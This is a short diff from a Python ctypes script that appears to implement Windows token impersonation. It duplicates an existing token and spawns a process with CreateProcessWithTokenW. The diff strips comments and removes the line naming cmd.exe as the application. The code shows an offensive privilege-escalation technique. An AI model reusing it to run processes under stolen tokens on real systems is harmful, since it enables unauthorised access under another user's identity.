@@ -152,18 +152,17 @@ def execute(window_name=None):
         print("[!] Token Duplication failed with error code {0}".format(k_handle.GetLastError()))
 
     hToken = hExistingToken
-    dwLogonFlags = 0x00000001 # Use the Flag LOGON_WITH_PROFILE
-    lpApplicationName = "C:\\Windows\\System32\\cmd.exe"
+    dwLogonFlags = 0x00000001 
     lpCommandLine = None
-    dwCreationFlags = 0x00000010 # Use the Flag CREATE_NEW_CONSOLE
+    dwCreationFlags = 0x00000010 
     lpEnvironment = ctypes.c_void_p()
     lpCurrentDirectory = None
     lpStartupInfo = STARTUPINFO()
     lpProcessInformation = PROCESS_INFORMATION()
 
-    # Configure Startup Info
-    lpStartupInfo.wShowWindow = 0x1 # We want the window to show
-    lpStartupInfo.dwFlags = 0x1 # Use to flag to look at wShowWindow
+    
+    lpStartupInfo.wShowWindow = 0x1
+    lpStartupInfo.dwFlags = 0x1
     lpStartupInfo.cb = ctypes.sizeof(lpStartupInfo)
 
     v7 = a_handle.CreateProcessWithTokenW(
